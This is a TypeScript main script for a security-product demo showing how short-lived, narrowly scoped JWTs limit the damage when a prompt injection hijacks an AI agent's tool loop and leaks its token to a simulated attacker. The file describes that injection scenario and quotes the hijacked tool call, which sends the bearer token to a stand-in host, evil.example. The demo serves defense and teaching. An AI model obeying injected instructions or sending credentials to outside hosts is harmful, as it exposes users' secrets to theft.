/**
 * 1Claw — JWT TTL Defense demo
 *
 * Story in one paragraph:
 *   An AI agent holds its own 1Claw API key and stores a REAL third-party
 *   secret (an OpenWeather API key) for its user-facing workflow. A prompt
 *   injection hijacks the agent's tool-loop and exfiltrates the JWT it just
 *   exchanged. A second, hostile process receives the stolen token and
 *   tries to pivot into the vault. Because the JWT's TTL is only 3 seconds,
 *   its scopes are narrow ("api/**"), and it is bound to a single vault,
 *   the breach is survivable: damage is one secret, one direction, for
 *   at most a few seconds.
 *
 * Run:
 *   cd examples/jwt-ttl-defense
 *   cp .env.example .env
 *   # set ONECLAW_API_KEY=1ck_...
 *   npm install
 *   npm start
 */

import { exfilChannel, type LeakedCredential } from "./bus.js";
import { setup, teardown } from "./setup.js";
import { runVictimAgent } from "./victim.js";
import { runAttacker, type AttackAttempt } from "./attacker.js";
import { attacker, fail, note, ok, preview, section, step, warn } from "./pretty.js";

const BASE_URL = process.env.ONECLAW_BASE_URL ?? "https://api.1claw.xyz";
const API_KEY = process.env.ONECLAW_API_KEY;
const SLOW_DELAY_SECONDS = Number.parseInt(
    process.env.ATTACKER_SLOW_DELAY_SECONDS ?? "4",
    10,
);
const SHROUD_ENABLED = /^(1|true|yes|on)$/i.test(
    process.env.DEMO_SHROUD ?? "",
);

async function main() {
    if (!API_KEY) {
        console.error("Set ONECLAW_API_KEY in .env (needs a 1ck_ user key).");
        process.exit(1);
    }
    if (!API_KEY.startsWith("1ck_")) {
        console.error(
            "ONECLAW_API_KEY must be a USER key (1ck_…). This demo provisions agents and policies, which agent keys (ocv_…) cannot do.",
        );
        process.exit(1);
    }

    console.log("╔══════════════════════════════════════════════════════════════╗");
    console.log("║  1Claw — JWT TTL Defense (blast-radius containment)          ║");
    console.log("║  Prompt injection steals a token. 1Claw makes it cheap.      ║");
    console.log(
        SHROUD_ENABLED
            ? "║  Mode: + Shroud LLM proxy (prevention at the boundary)       ║"
            : "║  Mode: containment only (set DEMO_SHROUD=1 for prevention)   ║",
    );
    console.log("╚══════════════════════════════════════════════════════════════╝");

    // ── ACT 0: provision vault + scoped agent + narrow policy ────
    section("Act 0 — Provision the agent", "uses your 1ck_ user key");
    const res = await setup(BASE_URL, API_KEY!, { shroudEnabled: SHROUD_ENABLED });

    // The attacker listens on the exfil channel BEFORE the victim runs —
    // mirroring a real attacker who has already implanted their receiver.
    const waitForLeak: Promise<LeakedCredential> = exfilChannel
        .waitForNext(30_000)
        .then((l) => {
            attacker(
                "Exfil channel received a credential",
                `agent=${l.agentId} vault=${l.vaultId} note="${l.note}"`,
            );
            return l;
        });

    try {
        // ── ACT 1: victim agent does its job (and gets compromised) ──
        section(
            "Act 1 — Agent does legitimate work and gets compromised",
            "issues JWT, reads secret, processes a malicious user message",
        );
        const victim = await runVictimAgent(
            BASE_URL,
            res.agentId,
            res.agentApiKey,
            res.vaultId,
            res.secretPath,
            { shroudEnabled: res.shroudEnabled },
        );

        let attempts: AttackAttempt[] = [];

        // The victim returns synchronously w.r.t. publishing to the
        // exfil channel, so by this point we know definitively whether
        // the leak happened. Swallow the long-running wait promise to
        // avoid an unhandled rejection when we short-circuit.
        waitForLeak.catch(() => {});

        if (!victim.leaked) {
            // Shroud intercepted the LLM response — the exfil channel
            // never fires and the attacker has nothing to replay.
            section(
                "Act 2 — Attacker waits. Nothing arrives.",
                "Shroud blocked the response at the LLM boundary",
            );
            note(
                "The compromised tool-loop asked for http.get('https://evil.example/…Bearer <JWT>'),",
            );
            note(
                "but Shroud inspected the LLM response first and refused to forward it.",
            );
            note(
                "No credential ever surfaced on the exfil channel — attacker gets nothing.",
            );
        } else {
            const leak = await waitForLeak;
            const secondsBetween = (
                (leak.leakedAt - victim.issuedAt) / 1000
            ).toFixed(2);
            note(`JWT reached attacker ${secondsBetween}s after issuance.`);

            // ── ACT 2: hostile service attempts to weaponize the JWT ──
            section(
                "Act 2 — Attacker tries to pivot with the stolen JWT",
                "no API key, no session — just the leaked token",
            );
            attempts = await runAttacker(
                BASE_URL,
                leak.token,
                res.vaultId,
                res.secretPath,
                res.sensitivePath,
                SLOW_DELAY_SECONDS,
            );
        }

        // ── ACT 3: what the human operator sees (audit log + rotate) ──
        section(
            "Act 3 — Human response: audit trail + credential rotation",
            "every attempt is logged; rotating the agent key invalidates past issuance",
        );
        try {
            await showAuditTrail(res.client, res.agentId);
        } catch (err) {
            warn("Audit trail step failed — continuing", (err as Error).message);
        }
        try {
            await rotateAgentKey(res.client, res.agentId);
        } catch (err) {
            warn("Rotation step failed — continuing", (err as Error).message);
        }

        // ── Summary ──
        section("Summary");
        printSummary(attempts, { shroudEnabled: res.shroudEnabled, leaked: victim.leaked });
    } finally {
        await teardown(res);
    }
}

async function showAuditTrail(
    client: import("@1claw/sdk").OneclawClient,
    agentId: string,
): Promise<void> {
    step(
        "Querying audit log for recent events by this agent …",
        "polling for async writes (≤ 5s)",
    );

    // Audit writes are async, and the interesting story is the *duplicate*
    // secret.read events (victim + attacker hitting the same path with the
    // same JWT). Poll until we see both, or give up after ~5 seconds.
    type Ev = {
        action: string;
        actor_type: string;
        actor_id: string;
        resource_type?: string;
        resource_id?: string;
        timestamp?: string;
        created_at?: string;
        metadata?: Record<string, unknown>;
        details?: Record<string, unknown>;
    };

    let events: Ev[] = [];
    const started = Date.now();
    const deadline = started + 5000;
    while (Date.now() < deadline) {
        const q = await client.audit.query({ actor_id: agentId, limit: 20 });
        if (q.error || !q.data) {
            warn("Audit query failed — retrying", q.error?.message);
        } else {
            events = (q.data.events ?? []) as unknown as Ev[];
            const reads = events.filter((e) => e.action === "secret.read");
            if (reads.length >= 2) break;
        }
        await new Promise((r) => setTimeout(r, 500));
    }

    if (events.length === 0) {
        note(
            "No audit events surfaced within 5s — writes are async and may land later.",
        );
        return;
    }

    // Show newest events first (as the API returns them), with a marker on
    // duplicate reads of the same secret path.
    const readPathCounts = new Map<string, number>();
    for (const ev of events) {
        if (ev.action === "secret.read") {
            const path = (ev.metadata?.path ?? ev.details?.path ?? "") as string;
            readPathCounts.set(path, (readPathCounts.get(path) ?? 0) + 1);
        }
    }

    for (const ev of events.slice(0, 10)) {
        // The Vault API exposes this as `timestamp`; older SDK typings say
        // `created_at`. Tolerate both so the demo doesn't blow up on a
        // shape mismatch.
        const ts = String(ev.timestamp ?? ev.created_at ?? "");
        const parsed = Date.parse(ts);
        const when = Number.isFinite(parsed)
            ? new Date(parsed).toISOString().slice(11, 23)
            : "           ";
        const actor = `${ev.actor_type}:${String(ev.actor_id).slice(0, 8)}`;
        const resource = ev.resource_id
            ? `${ev.resource_type ?? "?"}:${String(ev.resource_id).slice(0, 8)}`
            : "-";
        const path = (ev.metadata?.path ?? ev.details?.path ?? "") as string;
        const pathStr = path ? `  path=${path}` : "";

        const isDupRead =
            ev.action === "secret.read" && (readPathCounts.get(path) ?? 0) >= 2;
        const marker = isDupRead ? "  ⚠ DUP-READ" : "";

        console.log(
            `       ${when}  ${ev.action.padEnd(22)} actor=${actor}  resource=${resource}${pathStr}${marker}`,
        );
    }

    const dupReadCount = [...readPathCounts.values()].filter((n) => n >= 2)
        .length;
    if (dupReadCount > 0) {
        note(
            `⚠ ${dupReadCount} secret path${dupReadCount === 1 ? "" : "s"} were read multiple times within seconds — classic replay signature.`,
        );
    }
    note(
        "Every read (legitimate and stolen-JWT) is chained into the tamper-evident audit log — a SIEM alert on duplicate secret.read within the TTL window catches this.",
    );
    note(
        "(Denied reads — e.g. the attacker's out-of-scope attempt — return 403 before the audit insert, so they don't appear here; request logs pick them up instead.)",
    );
}

async function rotateAgentKey(
    client: import("@1claw/sdk").OneclawClient,
    agentId: string,
): Promise<void> {
    step("Rotating agent API key (simulating human-triggered response) …");
    const rot = await client.agents.rotateKey(agentId);
    if (rot.error || !rot.data) {
        warn("Key rotation failed — skipping", rot.error?.message);
        return;
    }
    ok(
        "Agent key rotated",
        `new key preview=${preview(rot.data.api_key)} — any stolen API key is now dead`,
    );
    note("JWTs already in flight still expire on their own in ≤3s; no new ones can be minted.");
}

function printSummary(
    attempts: AttackAttempt[],
    ctx: { shroudEnabled: boolean; leaked: boolean },
): void {
    if (ctx.shroudEnabled && !ctx.leaked) {
        console.log(
            "  ✓ prevented  LLM response filter     (shroud:response_filter + network_detection)",
        );
        console.log("");
        console.log("  Blast radius: 0 secrets leaked, 0 attacker attempts occurred.");
        console.log(
            "  Shroud stopped the exfil at the LLM boundary — the JWT never left the agent.",
        );
        console.log(
            "  TTL + scope + vault binding remain as layered defenses if Shroud ever fails open.",
        );
        return;
    }

    for (const a of attempts) {
        const icon =
            a.outcome.kind === "success" ? "✗ stolen  "
            : a.outcome.kind === "forbidden" ? "✓ blocked "
            : a.outcome.kind === "expired" ? "✓ blocked "
            : "? unknown ";
        const reason =
            a.outcome.kind === "success"
                ? "in-scope path, JWT still fresh"
                : a.outcome.kind === "forbidden"
                ? "scope/vault binding"
                : a.outcome.kind === "expired"
                ? "TTL expired"
                : a.outcome.message;
        console.log(
            `  ${icon}  ${a.label.padEnd(22)}  ${a.path.padEnd(28)}  reason: ${reason}`,
        );
    }

    const stolen = attempts.filter((a) => a.outcome.kind === "success").length;
    const blocked = attempts.length - stolen;
    console.log("");
    console.log(`  Blast radius: ${stolen} secret leaked, ${blocked} attempts blocked.`);
    console.log(
        "  The stolen secret is scoped (single path, single vault) and revocable (rotate + re-policy).",
    );
    console.log(
        "  Tip: set DEMO_SHROUD=1 to add Shroud at the LLM boundary — the leak gets prevented entirely.",
    );
}

main().catch((err) => {
    fail("Demo aborted", (err as Error).message);
    process.exitCode = 1;
});
